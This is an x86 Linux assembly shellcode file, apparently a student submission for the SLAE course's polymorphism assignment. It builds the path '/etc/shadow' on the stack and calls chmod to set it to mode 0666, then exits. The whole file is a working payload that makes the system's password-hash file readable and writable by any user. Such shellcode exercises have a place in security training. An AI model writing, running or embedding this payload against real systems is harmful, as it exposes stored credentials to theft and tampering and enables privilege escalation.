; SLAE Assignment 6: Polymorphic chmod(/etc/shadow, 0666) & exit()
; Author:  4p0cryph0n
; Website:  https://4p0cryph0n.github.io

global _start

section .text
_start:

  ;clear registers
  lahf                                        ;load flags
  cmc                                         ;complement the carry flag (random stuff)
  xor ecx, ecx                                ;ecx=0
  mul ecx                                     ;eax and ebx=0

  ;chmod
  add al,0xf                                  ;syscall number for chmod
  push ecx                                    ;push nulls onto the stack
  ;mov dword [esp-4], 0x776f6461               
  ;mov dword [esp-8], 0x68732f2f               
  ;mov dword [esp-12], 0x6374652f             ;/etc/shadow
  
  push dword 0x776f6461
  push dword 0x68732f2f
  push dword 0x6374652f

  ;sub esp, 12                                ;stack adjustment
  mov esi, esp                                ;move pointer to args into esi
  xchg ebx, esi                               ;move pointer to args into ebx
  push word 0x16d                             ;push 555
  pop ecx                                     ;pop it into ecx
  add ecx, 0x49                               ;add 111 to ecx, which makes it 666
  int 0x80                                    ;syscall
  xor eax, eax                                

  ;exit
  mov al, 0x1
  int 0x80
